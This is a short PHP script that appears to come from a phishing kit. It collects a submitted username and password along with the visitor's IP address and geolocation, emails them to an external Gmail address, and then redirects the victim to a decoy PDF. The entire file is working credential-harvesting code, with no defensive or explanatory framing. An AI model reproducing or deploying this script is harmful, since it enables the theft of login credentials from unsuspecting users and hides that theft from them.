<?php
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
 
$geoplugin->locate();
$result = "other";
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "other Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= 
	"City: {$geoplugin->city} \n".
	"Region: {$geoplugin->region} \n".
	"Country Name: {$geoplugin->countryName} \n".
	"Country Code: {$geoplugin->countryCode} \n";
mail($recipient,$result,$message);

$recipient = "shemarfmoore886@gmail.com";
$subject = "Result!!!";
$headers = "From: other <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$result,$message,$headers))

{
?>                    
	
		   <script language=javascript>
window.location='Starting-Business-plan.pdf';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>